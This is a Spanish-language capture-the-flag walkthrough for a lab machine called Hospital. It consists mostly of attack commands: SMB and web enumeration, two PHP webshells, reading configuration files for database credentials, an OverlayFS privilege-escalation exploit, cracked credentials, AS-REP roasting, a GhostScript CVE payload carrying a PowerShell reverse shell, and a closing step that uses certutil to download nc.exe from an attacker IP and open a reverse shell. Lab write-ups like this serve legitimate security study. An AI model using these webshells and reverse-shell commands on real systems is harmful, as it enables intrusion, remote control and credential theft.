# Hospital - TryHackMe Walkthrough

**IP:** 10.10.11.241  
**Dominio:** hospital.htb

---

## 1. Enumeración Inicial

### SMB & RPC
```bash
smbclient -L 10.10.11.241
rpcclient -U "" 10.10.11.241 -N
```

---

## 2. Descubrimiento Web

### Directorios
```bash
wfuzz -c --hc=404,403 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://hospital.htb/FUZZ
```

```bash
gobuster dir -u http://hospital.htb:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15 -x php,html,txt -q
```

---

## 3. Webshell vía PHAR
Subida de archivo `.phar`:
```
http://hospital.htb:8080/uploads/not.a.shell.phar/?cmd=whoami
```

Contenido de shell:
```php
<?php echo fread(popen($_REQUEST['cmd'], "r"), 1000000); ?>
```

---

## 4. Revisión del servidor
```bash
cat /etc/apache2/sites-enabled/000-default.conf
cat /var/www/html/config.php
```

Credenciales:
```php
DB_USER: root
DB_PASS: my$passwd!
```

Acceso a MySQL:
```bash
mysql -uroot -p
# contraseña: my$passwd!
```

Consulta:
```sql
use hospital;
select * from users;
```

---

## 5. Escalada de Privilegios - OverlayFS
Exploit:
- [GitHub CVE-2023-2640 & CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh)

```bash
chmod +x exploit.sh
./exploit.sh
```

---

## 6. Cracking /etc/shadow
Credencial encontrada:
```
drwilliams:passwd
```

Verificación:
```bash
rpcclient -U 'drwilliams%passwd' 10.10.11.241 -c 'enumdomusers'
```

---

## 7. Kerberoasting / SPNs
```bash
impacket-GetNPUsers hospital.htb/ -no-pass -usersfile users.txt
```

---

## 8. GhostScript (CVE-2023-36664)

Payload postscript (`.eps`) con reverse shell en PowerShell:
```bash
python3 CVE_2023_36664_exploit.py -g -p "<powershell_payload>" -x ps
```

Conexión:
```bash
rlwrap -cAr nc -nlvp 1234
```

---

## 9. Webshell persistente
```php
<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>
```

Subida y ejecución:
```bash
curl http://10.10.15.53/cmd.php -o cmd.php
```

Uso:
```
https://hospital.htb/cmd.php?cmd=tasklist
```

---

## 10. Reverse Shell desde Windows
```powershell
certutil.exe -f -urlcache -split http:/[ip]:80/nc.exe nc.exe
nc.exe -e cmd [ip] 443
```

---

